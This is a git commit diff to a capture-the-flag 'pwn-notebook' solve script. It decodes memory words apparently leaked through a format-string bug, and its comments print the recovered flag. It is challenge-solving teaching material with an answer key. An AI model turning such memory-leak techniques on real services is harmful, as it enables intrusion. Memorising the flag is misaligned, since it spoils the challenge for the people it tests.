8c58d7e82369e4bddccd8069cf1f6ef180775301
Martin Petkov <mpetkov@google.com>
2021-09-20 23:18:37 -0400

    Rev in solve.sh to make it easier

--- 11-pwn-notebook/solve.sh
+++ 11-pwn-notebook/solve.sh
@@ -3,14 +3,15 @@
 ./gencommands.sh >commands.txt
 ./connect.sh <commands.txt | grep '^<.*>$' | grep -v 'nil' | tr -d '<>' >hexdump.txt
 while read line; do
-  echo "${line} -> $(echo ${line} | xxd -r -p)"
+  # rev due to endianness, we want to read it backwards.
+  echo "${line} -> $(echo ${line} | xxd -r -p | rev)"
 done <hexdump.txt
 
 # You get this
-# 0x696d655200000000 -> imeR
-# 0x5443203a7265646e -> TC :redn
-# 0x74616d726f667b46 -> tamrof{F
-# 0x5f676e697274735f -> _gnirts_
-# 0x5f6568745f726f66 -> _eht_rof
-# 0x7d6e6977 -> }niw
+# 0x696d655200000000 -> Remi
+# 0x5443203a7265646e -> nder: CT
+# 0x74616d726f667b46 -> F{format
+# 0x5f676e697274735f -> _string_
+# 0x5f6568745f726f66 -> for_the_
+# 0x7d6e6977 -> win}
 
